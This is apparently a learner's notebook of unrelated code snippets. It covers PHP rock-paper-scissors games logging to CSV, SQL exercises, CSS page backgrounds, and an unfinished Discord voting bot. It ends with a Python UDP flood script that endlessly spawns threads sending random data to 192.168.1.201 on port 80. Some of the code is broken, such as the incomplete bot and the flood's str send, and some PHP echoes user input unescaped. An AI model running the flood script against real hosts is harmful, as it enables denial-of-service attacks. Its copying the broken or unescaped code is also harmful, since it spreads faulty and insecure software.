```php

テキストファイルにある数字を1桁ずつすべて配列に格納してhtmlのimgでforeach使って呼び出す
ためすなり
`str_split(変数、要素ごとに格納する文字数)`で配列に入れてる
今回は1桁ずつやから引数が１
$countNumがたとえば123やった場合
`['1', '2', '3']`になる
それをforeachですべてまわす
画像ファイルは「2.jpg」とかにした方がforeachのとき楽
なるほど、さんこうになる
```php

```php
<?php
    $user_hand = $_GET['janken'];
    $cpu_hand = rand(0, 8);
    
    if(0 <= $cpu_hand && $cpu_hand < 3):
        $cpu_hand = 'グー';
    elseif(3 <= $cpu_hand && $cpu_hand < 6):
        $cpu_hand = 'チョキ';
    elseif(6 <= $cpu_hand && $cpu_hand < 9):
        $cpu_hand = 'パー';
    endif;

    if($user_hand == $cpu_hand):
        $win_or_los = '引き分け';
    elseif($user_hand == 'グー' && $cpu_hand == 'チョキ' or $user_hand == 'チョキ' && $cpu_hand == 'パー' or $user_hand == 'パー' && $cpu_hand == 'グー'):
        $win_or_los = '勝ち';
    elseif($user_hand  == 'グー' && $cpu_hand == 'パー' or $user_hand  == 'チョキ' && $cpu_hand == 'グー' or $user_hand  == 'パー' && $cpu_hand == 'チョキ'):
        $win_or_los = '負け';
    endif;

    $fp = fopen('janken_history.csv', 'a');
    $new_history = $user_hand.','.$cpu_hand.','.$win_or_los.PHP_EOL;
    fwrite($fp, $new_history);
    fclose($fp);

    $fp = fopen('janken_history.csv', 'r');
    $value = fgets($fp);
    $historylist = [];
    while($value):
        $history = explode(',', $value);
        $historylist = $history;
        $value = fgets($fp);
    endwhile;
    fclose($fp);
?>
```

```

<?php
    $fp = fopen('new.csv','r');
    $val = fgets($fp);
    while($val):  
        $name = explode(',', $val);
        $nameList[] = $name;
        $val = fgets($fp);
    endwhile;
    fclose($fp);
?>

    </head>
    <body>
        <table>
<?php for($i=0; $i<count($nameList); $i++): ?>
            <tr>
<?php for($j=0; $j<count($nameList); $j++): ?>
                <td><?php echo $nameList[$i][$j]?></td>
<?php endfor; ?>
            </tr>
<?php endfor; ?>

</html>

<?php
    $rps = [
        '0' => 'グー',
        '1' => 'チョキ',
        '2' => 'パー'
    ];
    // グー(0) チョキ(1) パー(2) //
    $my_hand = (int)$_POST['rps'];
    $honda_hand = rand(0,2);

    $result_hand = ($my_hand-$honda_hand+3) % 3;
    if($result_hand == 0){
        $result = 'あいこ';
        $winlose = '0';
    }elseif($result_hand == 1){
        $result = 'まけ';
        $winlose = '0';
    }else{
        $result = 'かち';
        $winlose = '1';
    }

    $fp = fopen('result.csv', 'a');
    fputs($fp, $rps[$my_hand].','.$rps[$honda_hand].','.$result.','.$winlose."\r\n");
    fclose($fp);

    $fp = fopen('result.csv', 'r');
    while($tmp = fgets($fp)){
        $data_list[] = explode(',', $tmp);
    }
    fclose($fp);

    $count = count($data_list);
    $count_win = 0;
    foreach($data_list as $value){
        if($value[3] == 1){
            $count_win++;
        }
    }
    $win_rate = $count_win / $count * 100;
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <p>自分の手:<?php echo $rps[$my_hand]; ?>　相手の手:<?php echo $rps[$honda_hand]; ?></p>
    <p style="font-size: 2em;color: red;"><?php echo $result; ?>　勝率<?php echo $win_rate; ?>％</p>

    <table>
    <?php foreach($data_list as $value): ?>
        <tr>
            <td>自分の手：<?php echo $value[0]; ?>　</td>
            <td>相手の手：<?php echo $value[1]; ?>　</td>
            <td>結果：<?php echo $value[2]; ?>　</td>
        </tr>
    <?php endforeach; ?>
    </table>
</body>

```php
<?php

$janken_list = array('グー', 'チョキ', 'パー');
$janken_win = array(1, 2, 0);
$count = 0;

if (isset($_POST['janken'])){
    $com_val = mt_rand(0, 2);
    $com = $janken_list[$com_val];
    $me_val = (int)$_POST['janken'];
    $me = $janken_list[$me_val];

    if ($me_val === $com_val){
        $result = 'あいこ';
        $flag = 0;
    }
    else if ($janken_win[$me_val] === $com_val){
        $result = '勝ち';
        $flag = 1;
    }
    else{
        $result = '負け';
        $flag = 2;
    }
    $result_list = array($me, $com, $result, $flag);

    // 記録読み込み
    $path = './result.csv';
    $data = array();

    if (file_exists($path)){
        if (($fp = fopen($path, 'r')) !== FALSE){
            while(($line = fgetcsv($fp))){
                $data[] = $line;
            }
            fclose($fp);
        }
    }
    $data[] = $result_list;

    // 記録書き込み
    if (($fp = fopen($path, 'a')) !== FALSE){
        fputcsv($fp, $result_list);
        fclose($fp);
    }

    // 勝率計算
    $win_count = 0;
    foreach($data as $line){
        if ($line[3] == 1){
            $win_count++;
        }
    }
    $win_rate = round((($win_count / count($data)) * 100), 1);

}
else{
    $result = '入力されていません';
    $me = '';
    $com = '';
}

?>
```
```html
<!DOCTYPE HTML>
<html lang="ja">
    <head>
        <meta charset = "utf-8">
        <title>output</title>
    </head>
    <body>
        <table border='1'>
            <tr>
                <th>回数</th>
                <th>自分の手</th>
                <th>コンピュータの手</th>
                <th>結果</th>
            </tr>
            <?php foreach($data as $line): ?>
                <tr>
                    <td><?php echo ++$count; ?>
                    <td><?php echo $line[0]; ?></td>
                    <td><?php echo $line[1]; ?></td>
                    <td><?php echo $line[2]; ?></td>
                </tr>
            <?php endforeach; ?>
            <tr>
                <th colspan='2'>勝率</th>
                <th colspan='2'><?php echo $win_rate; ?>%</th>
            </tr>
        </table>
        <hr>
        <a href='./input18.php'>戻る</a>
    </body>
</html>
```

```php
<?php
    if(isset($_GET['input'])){
        $input = $_GET['input'];
        $name = $input[0];
        $title = $input[1];
        $message = $input[2];

        $fp = fopen('data.csv', 'r');
        //===ここから連番処理===//
        $num[] = 0;
        while($line = fgets($fp)){
            $tmp = explode(',', $line);
            $num[] = $tmp[0];
        }
        $max_num = (int)max($num);
        $max_num++;
        fclose($fp);

        //===ここからファイル書き込み===//
        $fp = fopen('data.csv', 'a');
        fputs($fp, $max_num.','.$name.','.date("Y/m/d H:i:s").','.$title.','.$message."\r\n");
        fclose($fp);
        header('location:index.php');
    }
    //===ここから表示のための処理===//
    $fp = fopen('data.csv', 'r');
    while($tmp = fgets($fp)){
        $data_list[] = explode(',', $tmp);
    }
    var_dump($data_list);
    fclose($fp);
?>
```

DBの追加授業の時にもらったプリント
画像がほしいんやけど
```
問４
SELECT pay_date AS 支払日 AVG(amount) AS 平均金額
FROM salary
WHERE employee_id IN(20,30)
GROUP BY pay_date
HAVING AVG(amount) >= 2000;
```
```
問３
SELECT SUM(price) AS 合計金額,count(*) AS 件数
FROM products
WHERE price <= 700;
```
```
問２
SELECT customer_id AS 顧客ID,count(*) AS 件数
FROM sales
GROUP BY customer_id;
```
```
問１
SELECT count(*) AS 件数
FROM product
WHERE category_id IN(1,3,5);
```

/talk
```html
<!DOCTYPE html>
<html lang="ja">
<head>
    <link rel="stylesheet" href="tes.css">
    <title>Document</title>
</head>
<body>
<header>
    <nav>
        <ul>
            <li><a href="#page1">ページ１</a></li>
            <li><a href="#page2">ページ２</a></li>
            <li><a href="#page3">ページ３</a></li>
        </ul>
    </nav>
</header>
<main>
    <!-- 作りたいページ分 div か article を作成し、わかりやすいように id を設定する -->
    <article id="page1"></article>
    <article id="page2"></article>
    <article id="page3"></article>
    <!--これだと 3ページ-->
</main>
</body>
</html>
```
```css
/* これは初期化 */
* {
  padding: 0;
  margin: 0;
}
/* 作った article か div の高さを1ページ分にするため heightを100vhにする */
#page1, #page2, #page3 {
  height: 100vh;
  background-size: cover;
}
/* それぞれの article か div に background-image を設定する */
#page1 {
  background-image: url(./1.jpg);
}

#page2 {
  background-image: url(./2.jpg);
}

#page3 {
  background-image: url(./3.jpg);
}
/* これでページごとに背景を設定できる */
```

```python
import discord
from discord.ext import commands
from discord.ext import tasks

class VotingCommands(commands.Cog, name='投票'):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name='voting')
    async def voting(self, ctx, *args):
        """投票機能だよ。"""

        print(args)
        answer = args[2:len(args)]
        stamp = { 0 : '1⃣', 1 : '2⃣', 2 : '3⃣', 3 : '4⃣'} 

        reply = '\r\n'
        reply += '質問：' + args[0] + '\r\n'
        reply += '時間：' + args[1] + '分' + '\r\n'
        for i in range(0, len(answer)):
            reply += stamp[i] + '：' + answer[i] + '\r\n'
        reply += '\r\n'

        message = await ctx.send(reply)

        for i in range(0, len(answer)):
            await message.add_reaction(stamp[i])

        time = args[1]
        @task.loop(second=1)
        async def loop_cheack():
    

def setup(bot):
    bot.add_cog(VotingCommands(bot))
```
↑voting.py

class Voting():
    def __init__(self, time):
        elapsed_time = time * 60
```
↑main.py

    def check(reaction, user):
        emoji = str(reaction.emoji)
        if user.bot == True:    # botは無視
            pass
        else:
            return emoji == '1⃣' or emoji == '2⃣'
```

/py ```py
import os, sys
import socket
import time, threading
import random, string

class Attack_Flood(threading.Thread):
    def __init__(self, host, port, data):
        super(Attack_Flood, self).__init__()
        self.host = host
        self.port = port       
        self.data = data
        
    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect((self.host, self.port))            
            sock.send(self.data)
        except:
            pass
data = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(65505)])

iphost = '192.168.1.201'
port = 80

while True: 
    thattack = Attack_Flood(iphost, port, data).start()
```
